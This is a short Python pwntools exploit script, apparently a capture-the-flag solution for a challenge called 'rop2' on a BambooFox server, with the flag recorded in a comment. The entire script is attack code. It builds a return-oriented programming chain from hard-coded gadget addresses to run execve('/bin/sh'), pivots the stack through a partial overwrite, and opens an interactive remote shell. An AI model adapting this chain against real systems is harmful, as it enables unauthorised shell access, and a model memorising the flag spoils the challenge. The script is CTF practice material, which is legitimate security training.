#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

'''
No ASLR version exploit
cat /proc/sys/kernel/randomize_va_space
0 -> no aslr

BambooFox{Partialoverwrite_is_a_useful_skill}
'''

#r = process('./rop2')
r = remote('bamboofox.cs.nctu.edu.tw', 12018)

buf2 = 0x6ccd60
pop_rbp_ret = 0x4004d1 
pop_rax_rdx_rbx_ret = 0x0000000000478616
pop_rdi_ret = 0x0000000000401516
pop_rsi_ret = 0x0000000000401637
pop_rdx_ret = 0x00000000004428e6
syscall = 0x00000000004003da
leave_ret = 0x00000000004009e4

rop1 = flat(
    '/bin/sh\x00', pop_rdi_ret, 0x6ccd60, 
    pop_rsi_ret, 0, pop_rax_rdx_rbx_ret, 0x3b,
    0, 0, syscall
)

r.sendline(rop1)


rop = flat(
    pop_rbp_ret , buf2, leave_ret , 0 
)
r.recvuntil('input')
r.send(rop.ljust(0x20,'a') + '\x08')


r.interactive()
